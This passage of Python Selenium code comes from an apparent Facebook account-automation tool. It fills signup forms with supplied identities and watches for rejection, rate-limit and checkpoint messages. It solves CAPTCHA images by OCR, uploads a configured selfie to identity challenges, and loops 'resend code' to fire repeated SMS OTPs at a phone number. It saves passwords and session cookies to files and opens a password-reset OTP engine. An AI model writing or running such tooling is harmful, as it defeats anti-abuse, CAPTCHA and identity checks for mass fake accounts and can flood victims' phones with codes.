            "//div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue')]",
            "//button[@name='next']",
            "//button[contains(@class, 'next') or contains(@id, 'next')]",
            "//button[@type='submit']",
            "//div[@role='button'][@aria-label='Next' or @aria-label='Continue']"
        ]
        for sel in selectors:
            for b in driver.find_elements(By.XPATH, sel):
                try:
                    if b.is_displayed():
                        driver.execute_script("arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});", b)
                        driver.execute_script("arguments[0].click();", b)
                        clicked = True
                        break
                except Exception:
                    pass
            if clicked:
                break

        if not clicked:
            try:
                driver.execute_script("""
                    let btns = Array.from(document.querySelectorAll('button, div[role="button"], input[type="submit"]'));
                    for (let b of btns) {
                        let t = (b.innerText || b.value || b.getAttribute('aria-label') || '').trim().toLowerCase();
                        if ((t.includes('next') || t.includes('continue')) && b.offsetParent !== null) {
                            b.click();
                            break;
                        }
                    }
                """)
            except Exception:
                pass
        await asyncio.sleep(0.6 if self.mode == "instant" else 1.2)

    async def _wait_for_element_visible(self, driver, locator: Tuple[str, str], timeout: float = 6.0):
        st = time.time()
        by, sel = locator
        while time.time() - st < timeout:
            for el in driver.find_elements(by, sel):
                if el.is_displayed():
                    return el
            await asyncio.sleep(0.1)
        return None

    def _is_checkpoint(self, driver) -> bool:
        url = get_safe_current_url(driver).lower()
        if "checkpoint" in url or "challenge" in url or "prove_you_are_human" in url:
            return True
        try:
            src = (driver.page_source or "").lower()
            return any(t in src for t in ["prove you are human", "we suspended your account", "upload a photo of yourself", "confirm that you own this account"])
        except Exception:
            return False

    def _detect_registration_dom_errors(self, driver, contact_val: str) -> Optional[Tuple[str, str]]:
        """
        Inspect DOM, body text, error banners, and URL for registration rejections.
        Returns (status_label, detailed_diagnostics) if a failure/rejection occurred, else None.
        """
        from selenium.webdriver.common.by import By
        try:
            body_txt = get_safe_body_text(driver)
            body_lower = body_txt.lower()
            curr_url = get_safe_current_url(driver).lower()

            # 1. Inspect explicit alert/error containers first
            error_selectors = [
                "div[role='alert']",
                "div#error_box",
                "div.error_box",
                ".uiErrorBox",
                "div#reg_error",
                "div#reg_error_inner",
                "div[data-sigil*='error']",
                "div[class*='error']",
                "div[class*='alert']",
                "div[class*='banner']"
            ]
            extracted_box_text = None
            for sel in error_selectors:
                for el in driver.find_elements(By.CSS_SELECTOR, sel):
                    try:
                        if el.is_displayed():
                            t = (el.text or "").strip()
                            t_low = t.lower()
                            normal_headings = [
                                "what's your name", "what is your name", "import your name",
                                "what's your birthday", "what is your birthday", "what's your gender",
                                "enter your mobile", "create a password", "join facebook", "create new account"
                            ]
                            if t and len(t) > 3 and not any(ign in t_low for ign in ["cookie", "facebook"]) and not any(h in t_low for h in normal_headings):
                                extracted_box_text = t
                                break
                    except Exception:
                        pass
                if extracted_box_text:
                    break

            # 2. Check for Phone Rejection / Unaccepted Contact
            phone_err_keywords = [
                "valid mobile number",
                "valid phone number",
                "enter a valid phone",
                "enter a valid mobile",
                "number you entered is invalid",
                "invalid number",
                "this phone number cannot be used",
                "cannot be used to sign up",
                "unrecognized phone number",
                "enter a valid country code",
                "phone number you entered doesn't look valid",
                "we couldn't verify this phone number"
            ]
            if any(k in body_lower for k in phone_err_keywords):
                diag = extracted_box_text or "Facebook rejected phone number as invalid or unsupported for registration."
                if not extracted_box_text:
                    for line in body_txt.splitlines():
                        if any(k in line.lower() for k in phone_err_keywords):
                            diag = line.strip()
                            break
                return "INVALID PHONE ⚠️", diag

            # 3. Check for Already Registered
            already_reg_keywords = [
                "already registered",
                "account already exists",
                "belongs to an existing account",
                "already associated with an account",
                "another account is using",
                "looks like you already have an account",
                "create a new account with this mobile"
            ]
            if any(k in body_lower for k in already_reg_keywords):
                diag = extracted_box_text or f"Contact '{contact_val}' already belongs to an existing Facebook account."
                if not extracted_box_text:
                    for line in body_txt.splitlines():
                        if any(k in line.lower() for k in already_reg_keywords):
                            diag = line.strip()
                            break
                return "ALREADY REGISTERED ⚠️", diag

            # 4. Check for Generic Creation Rejection
            generic_fail_keywords = [
                "we couldn't create your account",
                "couldn't create account",
                "an error occurred while creating",
                "an error occurred",
                "something went wrong",
                "there was an error with your registration",
                "registration failed",
                "sorry, something went wrong"
            ]
            if any(k in body_lower for k in generic_fail_keywords):
                diag = extracted_box_text or "Facebook reported an error during account creation submission."
                if not extracted_box_text:
                    for line in body_txt.splitlines():
                        if any(k in line.lower() for k in generic_fail_keywords):
                            diag = line.strip()
                            break
                return "CREATION FAILED (Facebook Error) ⚠️", diag

            # 5. Check for Rate Limiting / Abuse Protection / Temporary Blocks
            rate_limit_keywords = [
                "temporarily blocked",
                "you're temporarily blocked",
                "cannot create an account right now",
                "can't create an account right now",
                "too many attempts",
                "we limit how often",
                "misusing this feature",
                "action blocked",
                "you have created too many accounts",
                "limit reached"
            ]
            if any(k in body_lower for k in rate_limit_keywords):
                diag = extracted_box_text or "Facebook temporarily blocked account creation from this IP/device."
                if not extracted_box_text:
                    for line in body_txt.splitlines():
                        if any(k in line.lower() for k in rate_limit_keywords):
                            diag = line.strip()
                            break
                return "REGISTRATION RATE LIMITED ⚠️", diag

            # 5. Check for Security Checkpoint / CAPTCHA / Identity Challenge
            if self._is_checkpoint(driver):
                diag = extracted_box_text or "Account routed to Facebook security checkpoint / identity challenge."
                return "SECURITY CHECKPOINT ⚠️", diag

            # 6. Check for Validation Errors (Name, Password, DOB)
            validation_keywords = [
                "please enter a valid name",
                "names on facebook can't have",
                "please enter your first name",
                "please enter your last name",
                "please enter your name",
                "please choose a more secure password",
                "password must be at least",
                "password is too common",
                "you must be at least"
            ]
            if any(k in body_lower for k in validation_keywords):
                diag = extracted_box_text or "Registration field validation error."
                if not extracted_box_text:
                    for line in body_txt.splitlines():
                        if any(k in line.lower() for k in validation_keywords):
                            diag = line.strip()
                            break
                # Do not reject if the extracted diagnostic is a standard step title
                diag_lower = diag.lower()
                if not any(h in diag_lower for h in ["what's your name", "what is your name", "import your name", "what's your birthday"]):
                    return "REGISTRATION VALIDATION ERROR ⚠️", diag

            # 7. If an explicit error box is visible with generic text
            if extracted_box_text and any(w in extracted_box_text.lower() for w in ["error", "problem", "cannot", "sorry", "failed", "invalid"]):
                return "REGISTRATION ERROR ⚠️", extracted_box_text

            return None
        except Exception:
            return None


    async def _resolve_staging_challenge_hook(self, driver, index: int):
        from selenium.webdriver.common.by import By

        # 1. CAPTCHA crop & OCR resolution
        img_el = None
        for sel in ["//img[contains(@src, 'captcha')]", "//img[contains(@src, 'challenge')]", "//div[contains(@class, 'captcha')]//img"]:
            try:
                for e in driver.find_elements(By.XPATH, sel):
                    if e.is_displayed():
                        img_el = e
                        break
                if img_el: break
            except Exception: pass

        if img_el:
            print_log_line("CAPTCHA", "Security challenge image found. Capturing screenshot...", "WARN")
            os.makedirs("debug_states", exist_ok=True)
            png_bytes = img_el.screenshot_as_png
            sc_path = f"debug_states/captcha_{int(time.time())}.png"
            with open(sc_path, "wb") as f:
                f.write(png_bytes)
            print_log_line("CAPTCHA", f"Diagnostic screenshot saved to {sc_path}", "WARN")

            token, tier_name, conf = await MultiTierOCR.resolve(png_bytes)
            if token:
                print_log_line("CAPTCHA", f"Resolved token [{token}] via {tier_name} (conf: {round(conf, 2)})", "SUCCESS")
                for inp in driver.find_elements(By.CSS_SELECTOR, "input[name='captcha_response'], input[type='text']"):
                    if inp.is_displayed():
                        inp.clear()
                        inp.send_keys(token)
                        await asyncio.sleep(0.2)
                        btn = driver.find_elements(By.XPATH, "//div[@role='button'][contains(., 'Continue')] | //button[@type='submit']")
                        if btn: driver.execute_script("arguments[0].click();", btn[0])
                        await asyncio.sleep(1.5)
                        break

        # 2. Virtual Media / Avatar upload handling
        body_txt = get_safe_body_text(driver).lower()
        if "photo" in body_txt or "selfie" in body_txt or "upload" in body_txt or "prove you are human" in body_txt:
            cfg_selfie = SettingsManager.load().get("kyc_image_url") or DEFAULT_SELFIE_URL
            sanitized_path = MediaInjectionService.sanitize_image(cfg_selfie)
            for finp in driver.find_elements(By.CSS_SELECTOR, "input[type='file']"):
                try:
                    finp.send_keys(sanitized_path)
                    print_log_line("APPEAL", f"Injected EXIF-sanitized image buffer from {cfg_selfie[:35]}...", "ACTION")
                    await asyncio.sleep(0.5)
                    btn = driver.find_elements(By.XPATH, "//div[@role='button'][contains(., 'Continue')] | //button[@type='submit']")
                    if btn: driver.execute_script("arguments[0].click();", btn[0])
                    break
                except Exception: pass

    def _submit_otp_code(self, driver, code: str):
        from selenium.webdriver.common.by import By
        inp = None
        for sel in ["//input[@name='code']", "//input[contains(@id, 'code')]", "//input[@type='number']", "//input[contains(@aria-label, 'code')]", "//input[@type='text']"]:
            try:
                for el in driver.find_elements(By.XPATH, sel):
                    if el.is_displayed():
                        inp = el; break
                if inp: break
            except Exception: pass

        if inp:
            inp.clear()
            inp.send_keys(code)
            time.sleep(0.3)
            for b_sel in [
                "//button[contains(translate(., 'CONTINUE', 'continue'), 'continue')]",
                "//button[contains(translate(., 'CONFIRM', 'confirm'), 'confirm')]",
                "//div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue')]",
                "//div[@role='button'][contains(translate(., 'CONFIRM', 'confirm'), 'confirm')]",
                "//button[@type='submit']"
            ]:
                try:
                    for b in driver.find_elements(By.XPATH, b_sel):
                        if b.is_displayed():
                            driver.execute_script("arguments[0].click();", b)
                            return
                except Exception: pass

    async def _handle_phone_confirmation_and_resend(self, driver, contact_val: str, index: int, total: int) -> Tuple[int, int]:
        """
        Handles phone confirmation screen & OTP resend multiplier loop:
        1. On 'Confirm your mobile number' screen: selects SMS radio button and clicks Continue.
        2. On 'Enter the confirmation code' screen: records initial send (1x).
           If resend_multiplier > 1:
             - Clicks 'I didn't receive the code'
             - Clicks 'Resend code to SMS' from the action dialog
             - Polls for 'Confirmation code resent' toast banner
             - Increments valid resends if toast detected, logs attempts otherwise.
        Returns (valid_sends, attempt_sends).
        """
        from selenium.webdriver.common.by import By
        valid_sends = 1
        attempt_sends = 1

        try:
            # Step 1: Detect and handle "Confirm your mobile number" screen
            for _ in range(6):
                try:
                    body_now = get_safe_body_text(driver)
                    body_lower = body_now.lower()
                except Exception:
                    body_lower = ""

                if ("confirm your mobile" in body_lower or "choose how you want to confirm" in body_lower) and ("sms" in body_lower or "whatsapp" in body_lower):
                    write_runtime_log("ACTION", "PHONE_CONFIRM", f"Detected 'Confirm your mobile number' screen for {contact_val}. Selecting SMS radio...")
                    # Find and select the SMS radio option (skip WhatsApp)
                    radios = driver.find_elements(By.CSS_SELECTOR, "input[type='radio'], div[role='radio'], input[type='checkbox']")
                    selected_radio = None
                    for rad in radios:
                        ctx = _extract_radio_context(driver, rad)
                        if "whatsapp" in ctx: continue
                        if any(w in ctx for w in ["sms", "text", "phone", "mobile", "code via sms", "carrier charges"]):
                            selected_radio = rad
                            break
                    if not selected_radio and radios:
                        # Fallback: choose first non-whatsapp radio
                        for rad in radios:
                            if "whatsapp" not in _extract_radio_context(driver, rad):
                                selected_radio = rad
                                break

                    if selected_radio:
                        driver.execute_script("try { arguments[0].checked = true; } catch(e){} arguments[0].click();", selected_radio)
                        r_id = selected_radio.get_attribute("id")
                        if r_id:
                            lbls = driver.find_elements(By.CSS_SELECTOR, f"label[for='{r_id}']")
                            if lbls:
                                driver.execute_script("arguments[0].click();", lbls[0])
                        await asyncio.sleep(0.5)

                    # Click Continue button
                    cont_btns = driver.find_elements(By.XPATH, "//button[contains(translate(., 'CONTINUE', 'continue'), 'continue')] | //div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue')] | //input[@type='submit'][contains(translate(@value, 'CONTINUE', 'continue'), 'continue')]")
                    if cont_btns:
                        driver.execute_script("arguments[0].click();", cont_btns[0])
                        print_stage_log(total, index, "Clicked Continue")
                        await self._wait_for_dom_ready(driver)
                        await asyncio.sleep(1.5 if self.mode != "ultra" else 0.8)
                    break
                else:
                    if any(k in body_lower for k in ["enter the code", "confirmation code", "enter confirmation code", "didn't receive"]):
                        break
                    await asyncio.sleep(0.5)

            # Step 2: Confirm we are on the Enter Confirmation Code screen
            await self._wait_for_dom_ready(driver)
            print_stage_log(total, index, "otp input screen found")

            # Destination verification: check last 2 digits if shown
            clean_digits = re.sub(r"\D", "", contact_val)
            contact_last2 = clean_digits[-2:] if len(clean_digits) >= 2 else ""
            body_otp = get_safe_body_text(driver)
            otp_matches = []
            for m in re.finditer(r"(?:\+|(?<=\s))[\*•xX]{2,}(\d{2})\b", body_otp):
                otp_matches.append(m.group(1))
            for m in re.finditer(r"(?:code\s+to|sent\s+to|via\s+sms\s+to|belongs\s+to)\s*[:\s]*\+?[\*•xX\d\s\-]{3,}(\d{2})\b", body_otp, re.IGNORECASE):
                otp_matches.append(m.group(1))

            if otp_matches and contact_last2:
                screen_last2 = otp_matches[0]
                if screen_last2 == contact_last2:
                    write_runtime_log("MATCH", "RESEND_OTP", f"Verified OTP screen destination (+******{contact_last2}) matches target phone.")
                    print_stage_log(total, index, f"Verified SMS destination (+******{contact_last2})")
                else:
                    write_runtime_log("WARN", "RESEND_OTP", f"Phone mismatch on confirmation screen: found ..{screen_last2}, expected ..{contact_last2}")
                    print_stage_log(total, index, f"Phone mismatch on confirmation screen (found ..{screen_last2}, expected ..{contact_last2})", emoji="⚠️")

            write_runtime_log("INFO", "RESEND_OTP", f"Initial SMS OTP dispatch 1x confirmed for {contact_val}")

            # Step 3: Resend loop if resend_multiplier > 1
            if self.resend_multiplier > 1:
                needed_resends = self.resend_multiplier - 1
                for resend_idx in range(1, needed_resends + 1):
                    # 3a. Click "I didn't receive the code"
                    no_code_clicked = False
                    for _poll_nc in range(8):
                        no_code_btns = driver.find_elements(
                            By.XPATH,
                            "//button[contains(translate(., \"DIDN'T RECEIVE\", \"didn't receive\"), \"didn't receive\")] | "
                            "//a[contains(translate(., \"DIDN'T RECEIVE\", \"didn't receive\"), \"didn't receive\")] | "
                            "//div[@role='button'][contains(translate(., \"DIDN'T RECEIVE\", \"didn't receive\"), \"didn't receive\")] | "
                            "//span[contains(translate(., \"DIDN'T RECEIVE\", \"didn't receive\"), \"didn't receive\")]"
                        )
                        visible_nc = [b for b in no_code_btns if b.is_displayed()]
                        target_nc = visible_nc[0] if visible_nc else (no_code_btns[0] if no_code_btns else None)
                        if target_nc:
                            driver.execute_script("arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});", target_nc)
                            driver.execute_script("arguments[0].click();", target_nc)
                            no_code_clicked = True
                            write_runtime_log("ACTION", "RESEND_OTP", f"Clicked 'I didn't receive the code' (resend {resend_idx}/{needed_resends})")
                            await asyncio.sleep(0.8 if self.mode != "ultra" else 0.4)
                            break
                        await asyncio.sleep(0.4)

                    if not no_code_clicked:
                        write_runtime_log("WARN", "RESEND_OTP", "Could not locate 'I didn't receive the code' button")

                    # 3b. Click "Resend code to SMS" in action sheet / popup
                    resend_sms_clicked = False
                    for _poll_rs in range(8):
                        sms_btns = driver.find_elements(
                            By.XPATH,
                            "//button[contains(translate(., 'RESEND CODE TO SMS', 'resend code to sms'), 'resend code to sms') or contains(translate(., 'RESEND CODE VIA SMS', 'resend code via sms'), 'resend code via sms') or contains(translate(., 'RESEND SMS', 'resend sms'), 'resend sms') or contains(translate(., 'SEND CODE VIA SMS', 'send code via sms'), 'send code via sms')] | "
                            "//div[@role='button'][contains(translate(., 'RESEND CODE TO SMS', 'resend code to sms'), 'resend code to sms') or contains(translate(., 'RESEND CODE VIA SMS', 'resend code via sms'), 'resend code via sms') or contains(translate(., 'RESEND SMS', 'resend sms'), 'resend sms') or contains(translate(., 'SEND CODE VIA SMS', 'send code via sms'), 'send code via sms')] | "
                            "//a[contains(translate(., 'RESEND CODE TO SMS', 'resend code to sms'), 'resend code to sms') or contains(translate(., 'RESEND CODE VIA SMS', 'resend code via sms'), 'resend code via sms') or contains(translate(., 'RESEND SMS', 'resend sms'), 'resend sms')] | "
                            "//span[contains(translate(., 'RESEND CODE TO SMS', 'resend code to sms'), 'resend code to sms') or contains(translate(., 'RESEND CODE VIA SMS', 'resend code via sms'), 'resend code via sms') or contains(translate(., 'RESEND SMS', 'resend sms'), 'resend sms')]"
                        )
                        visible_sms = [b for b in sms_btns if b.is_displayed()]
                        target_sms = visible_sms[0] if visible_sms else (sms_btns[0] if sms_btns else None)
                        if target_sms:
                            driver.execute_script("arguments[0].click();", target_sms)
                            resend_sms_clicked = True
                            attempt_sends += 1
                            write_runtime_log("ACTION", "RESEND_OTP", f"Clicked 'Resend code to SMS' (Attempt {attempt_sends}x)")
                            break
                        await asyncio.sleep(0.3)

                    if not resend_sms_clicked:
                        write_runtime_log("WARN", "RESEND_OTP", "Could not locate 'Resend code to SMS' dialog option")

                    # 3c. Monitor for 'Confirmation code resent' toast banner
                    toast_detected = False
                    for _t_poll in range(12):
                        await asyncio.sleep(0.25)
                        try:
                            toasts = driver.find_elements(By.CSS_SELECTOR, "div[role='status'], div[role='alert'], div[class*='toast'], div[class*='snackbar'], div[class*='banner'], div[class*='notification'], span[role='status']")
                            for tel in toasts:
                                ttxt = (tel.text or "").strip().lower()
                                if any(k in ttxt for k in ["confirmation code resent", "code resent", "sent a new code", "code was resent", "resent"]):
                                    toast_detected = True
                                    break
                            if toast_detected: break

                            b_txt = get_safe_body_text(driver).lower()
                            if "confirmation code resent" in b_txt or "code resent" in b_txt:
                                toast_detected = True
                                break
                        except Exception:
                            pass

                    if toast_detected:
                        valid_sends += 1
                        print_stage_log(total, index, f"resend otp sent {valid_sends}x to ({contact_val}) [toast verified]")
                        write_runtime_log("SUCCESS", "RESEND_OTP", f"Confirmation code resent toast verified ({valid_sends}x) for {contact_val}")
                    else:
                        print_stage_log(total, index, f"resend otp clicked {attempt_sends}x (awaiting confirmation toast)")
                        write_runtime_log("WARN", "RESEND_OTP", f"Toast not detected for attempt {attempt_sends}x on {contact_val}")

                    # Inter-resend breathing delay
                    await asyncio.sleep(1.2 if self.mode != "ultra" else 0.6)

        except Exception as e:
            write_runtime_log("ERROR", "RESEND_OTP", f"Exception during phone confirmation/resend loop: {e}")

        return valid_sends, attempt_sends

    def _sweep_post_submission_barriers(
        self,
        driver,
        identity: Optional[Dict[str, Any]] = None,
        contact_val: Optional[str] = None,
        password: Optional[str] = None
    ) -> bool:
        """
        Actively inspect and dispatch post-submission interactive barriers on Facebook:
        1. Step 1 / Name confirmation ('What's your name?' / 'Import your name')
        2. Step 6 Terms & Policies: 'I agree', 'Agree', 'Sign Up', 'Finish signing up', 'Create account'
        3. Account deduplication dialogs: 'No, create new account', 'Create new account'
        4. Session preferences: 'Save your login info' -> 'Not now'
        5. Mobile confirmation prompts: 'Continue', 'Send Code', 'OK', 'Confirm'
        6. General popups / cookie dismissals
        Returns True if a barrier action was triggered, False otherwise.
        """
        from selenium.webdriver.common.by import By
        action_taken = False

        # 0a. Name Step Encountered Post-Submission ("What's your name?" / "Import your name")
        try:
            fn_inputs = driver.find_elements(By.NAME, "firstname") or driver.find_elements(By.CSS_SELECTOR, "input[id*='firstname'], input[name*='first']")
            ln_inputs = driver.find_elements(By.NAME, "lastname") or driver.find_elements(By.CSS_SELECTOR, "input[id*='lastname'], input[name*='last']")
            if fn_inputs and any(f.is_displayed() for f in fn_inputs):
                if identity:
                    first = identity.get("first_name", "Alex")
                    last = identity.get("last_name", "Rivera")
                    driver.execute_script("""
                        function setInputVal(el, val) {
                            if (!el) return;
                            var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                            if (setter) { setter.call(el, val); } else { el.value = val; }
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                            el.dispatchEvent(new Event('change', { bubbles: true }));
                        }
                        var fn = document.querySelector('input[name="firstname"], input#firstname_input, input[id*="firstname"], input[name*="first"]');
                        var ln = document.querySelector('input[name="lastname"], input#lastname_input, input[id*="lastname"], input[name*="last"]');
                        if (fn && (!fn.value || fn.value !== arguments[0])) setInputVal(fn, arguments[0]);
                        if (ln && (!ln.value || ln.value !== arguments[1])) setInputVal(ln, arguments[1]);
                    """, first, last)
                next_btns = driver.find_elements(By.XPATH, "//button[contains(translate(., 'NEXT', 'next'), 'next')] | //div[@role='button'][contains(translate(., 'NEXT', 'next'), 'next')] | //button[@type='submit'] | //input[@type='submit']")
                for nb in next_btns:
                    if nb.is_displayed():
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", nb)
                        write_runtime_log("ACTION", "BARRIER", "Handled post-submission Name step ('What\\'s your name?' / 'Import your name') -> Advanced Next")
                        return True
        except Exception:
            pass

        # 0b. Contact Step Encountered Post-Submission
        try:
            cp_inputs = driver.find_elements(By.NAME, "reg_email__") or driver.find_elements(By.CSS_SELECTOR, "input[type='tel'], input[name='contactpoint'], input[name*='phone'], input[id*='contact']")
            if cp_inputs and any(c.is_displayed() for c in cp_inputs) and contact_val:
                cp = next(c for c in cp_inputs if c.is_displayed())
                curr_cp = driver.execute_script("return arguments[0].value;", cp)
                if not curr_cp or curr_cp != contact_val:
                    driver.execute_script("""
                        var el = arguments[0];
                        var val = arguments[1];
                        var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                        if (setter) { setter.call(el, val); } else { el.value = val; }
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                        el.dispatchEvent(new Event('change', { bubbles: true }));
                    """, cp, contact_val)
                next_btns = driver.find_elements(By.XPATH, "//button[contains(translate(., 'NEXT', 'next'), 'next')] | //div[@role='button'][contains(translate(., 'NEXT', 'next'), 'next')] | //button[@type='submit']")
                for nb in next_btns:
                    if nb.is_displayed():
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", nb)
                        write_runtime_log("ACTION", "BARRIER", "Handled post-submission Contact step -> Advanced Next")
                        return True
        except Exception:
            pass

        # 0c. Password Step Encountered Post-Submission
        try:
            pwd_inputs = driver.find_elements(By.NAME, "reg_passwd__") or driver.find_elements(By.CSS_SELECTOR, "input[type='password'], input[name*='pass']")
            if pwd_inputs and any(p.is_displayed() for p in pwd_inputs) and password:
                pi = next(p for p in pwd_inputs if p.is_displayed())
                driver.execute_script("""
                    var el = arguments[0];
                    var val = arguments[1];
                    var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                    if (setter) { setter.call(el, val); } else { el.value = val; }
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                """, pi, password)
                for xpath in ["//button[contains(translate(., 'SIGN UP', 'sign up'), 'sign up')]", "//button[@name='submit']", "//input[@type='submit']", "//button[contains(translate(., 'NEXT', 'next'), 'next')]"]:
                    for b in driver.find_elements(By.XPATH, xpath):
                        if b.is_displayed():
                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", b)
                            write_runtime_log("ACTION", "BARRIER", "Handled post-submission Password step -> Dispatched submit")
                            return True
        except Exception:
            pass

        # 1. Terms & Policies / Final Step Agreement triggers
        agreement_selectors = [
            "//button[contains(translate(., 'I AGREE', 'i agree'), 'i agree')]",
            "//div[@role='button'][contains(translate(., 'I AGREE', 'i agree'), 'i agree')]",
            "//button[contains(translate(., 'AGREE', 'agree'), 'agree')]",
            "//div[@role='button'][contains(translate(., 'AGREE', 'agree'), 'agree')]",
            "//button[contains(translate(., 'FINISH SIGNING UP', 'finish signing up'), 'finish signing up')]",
            "//div[@role='button'][contains(translate(., 'FINISH SIGNING UP', 'finish signing up'), 'finish signing up')]",
            "//button[contains(translate(., 'CREATE ACCOUNT', 'create account'), 'create account')]",
            "//div[@role='button'][contains(translate(., 'CREATE ACCOUNT', 'create account'), 'create account')]",
            "//button[contains(translate(., 'SIGN UP', 'sign up'), 'sign up')]",
            "//div[@role='button'][contains(translate(., 'SIGN UP', 'sign up'), 'sign up')]",
            "//input[@type='submit'][contains(translate(@value, 'SIGN UP', 'sign up'), 'sign up')]"
        ]
        for xpath in agreement_selectors:
            try:
                for el in driver.find_elements(By.XPATH, xpath):
                    if el.is_displayed():
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", el)
                        write_runtime_log("ACTION", "BARRIER", f"Clicked Step 6 Agreement trigger: {xpath}")
                        action_taken = True
                        break
                if action_taken:
                    return True
            except Exception:
                pass

        # 2. 'No, create new account' dialog
        dedup_selectors = [
            "//button[contains(translate(., 'NO, CREATE NEW ACCOUNT', 'no, create new account'), 'no, create new account')]",
            "//div[@role='button'][contains(translate(., 'NO, CREATE NEW ACCOUNT', 'no, create new account'), 'no, create new account')]",
            "//a[contains(translate(., 'NO, CREATE NEW ACCOUNT', 'no, create new account'), 'no, create new account')]",
            "//button[contains(translate(., 'CREATE NEW ACCOUNT', 'create new account'), 'create new account')]",
            "//div[@role='button'][contains(translate(., 'CREATE NEW ACCOUNT', 'create new account'), 'create new account')]"
        ]
        for xpath in dedup_selectors:
            try:
                for el in driver.find_elements(By.XPATH, xpath):
                    if el.is_displayed():
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", el)
                        write_runtime_log("ACTION", "BARRIER", "Clicked 'No, create new account'")
                        action_taken = True
                        break
                if action_taken:
                    return True
            except Exception:
                pass

        # 3. 'Save login info for later' -> Click Not Now
        save_login_selectors = [
            "//button[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
            "//div[@role='button'][contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
            "//a[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
            "//span[contains(translate(., 'NOT NOW', 'not now'), 'not now')]"
        ]
        body_lower = get_safe_body_text(driver).lower()
        if "save" in body_lower and ("login info" in body_lower or "password" in body_lower or "later" in body_lower):
            for xpath in save_login_selectors:
                try:
                    for el in driver.find_elements(By.XPATH, xpath):
                        if el.is_displayed():
                            driver.execute_script("arguments[0].click();", el)
                            write_runtime_log("ACTION", "BARRIER", "Clicked 'Not now' on save login prompt")
                            action_taken = True
                            break
                    if action_taken:
                        return True
                except Exception:
                    pass

        # 4. Standard Popups & Cookie Dialogs
        self._sweep_popups(driver)
        return action_taken

    def _sweep_popups(self, driver):
        for xpath in self.POPUP_SELECTORS:
            try:
                for el in driver.find_elements("xpath", xpath):
                    if el.is_displayed():
                        driver.execute_script("arguments[0].click();", el)
                        break
            except Exception: pass

    def _save_record_to_files(self, rec: Dict[str, Any]):
        entry = (
            "==================================================\n"
            f"TIMESTAMP   : {rec['timestamp']}\n"
            f"INDEX       : {rec['index']}\n"
            f"ENDPOINT    : {rec['endpoint']}\n"
            f"MODE        : {rec['mode']}\n"
            f"STATUS      : {rec['status']}\n"
            f"DURATION    : {rec['time_taken']}s\n"
            f"NAME        : {rec['name']} (DOB: {rec['dob']})\n"
            f"GENDER      : {rec['gender']}\n"
            f"CONTACT     : {rec['contact']}\n"
            f"PASSWORD    : {rec['password']}\n"
            f"OTP USED    : {rec['otp']}\n"
            f"USER ID     : {rec['c_user']}\n"
            f"COOKIES     : {rec['cookies']}\n"
            f"DIAGNOSTICS : {rec['diagnostics']}\n"
            + (f"DISPATCHES  : {rec.get('valid_resends', 1)}x valid sends (Multiplier: {rec.get('resend_multiplier', 1)}x)\n" if rec.get("resend_multiplier", 1) > 1 else "")
            + "==================================================\n\n"
        )
        for filepath in self.output_files:
            try:
                existing = ""
                if os.path.isfile(filepath):
                    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                        existing = f.read()
                with open(filepath, "w", encoding="utf-8") as f:
                    f.write(entry + existing)
            except Exception:
                pass



# ==============================================================================
# Facebook Account Recovery & Reset OTP Engine (Options 5 & 6)
# ==============================================================================

class FacebookRecoveryEngine:
    """
    High-Fidelity Engine for Facebook Account Password Recovery (Option 5) and Reset OTP Trigger (Option 6).
    """
    RECOVERY_ENDPOINT = "https://m.facebook.com/login/identify"

    def __init__(self, config: Dict[str, Any], event_bus: EventBus):
        self.config = config
        self.event_bus = event_bus
        self.action = config.get("action", "reset_account")  # "reset_account" or "reset_otp"
        self.mode = config.get("mode", "ultra")
        self.dry_run = config.get("dry_run", False)
        self.password = config.get("password")
        self.proxy_mgr = ProxyManager(config.get("proxy"))
        self.reco_rounds = max(1, int(self.config.get("reco_rounds", 1)))
        self.processed_count = 0
        self.persistent_driver = None
        self.persistent_temp_dir = None

        endpoint_cfg = str(self.config.get("endpoint", "")).lower()
        if "limited" in endpoint_cfg:
            self.recovery_endpoint = "https://limited.facebook.com"
        elif "mbasic" in endpoint_cfg:
            self.recovery_endpoint = "https://mbasic.facebook.com/login/identify/?ctx=recover"
        elif endpoint_cfg.startswith("http"):
            self.recovery_endpoint = self.config.get("endpoint")
        else:
            self.recovery_endpoint = "https://m.facebook.com/login/identify"

    def close(self):
        """Cleanly terminate persistent driver in Ultra mode."""
        if self.persistent_driver:
            try:
                self.persistent_driver.quit()
            except Exception:
                pass
            self.persistent_driver = None
        if self.persistent_temp_dir and os.path.exists(self.persistent_temp_dir):
            shutil.rmtree(self.persistent_temp_dir, ignore_errors=True)
            self.persistent_temp_dir = None
        kill_zombie_browsers()

    async def _safe_navigate(self, driver, url: str):
        """Resilient navigation recovering from renderer timeouts using window.stop()."""
        try:
            await asyncio.to_thread(driver.get, url)
        except Exception as e:
            err_str = str(e).lower()
            if "timeout" in err_str or "renderer" in err_str:
                write_runtime_log("WARN", "NAVIGATE", f"Renderer wait reached limit on {url} ({e}); halting subresources with window.stop()...")
                try:
                    driver.execute_script("window.stop();")
                except Exception:
                    pass
            else:
                write_runtime_log("ERROR", "NAVIGATE", f"Navigation exception for {url}: {e}")
                raise

    async def _wait_for_dom_ready(self, driver, max_checks: int = 35):
        for _ in range(max_checks):
            try:
                cnt = driver.execute_script("return document.querySelectorAll('input, button, a').length;")
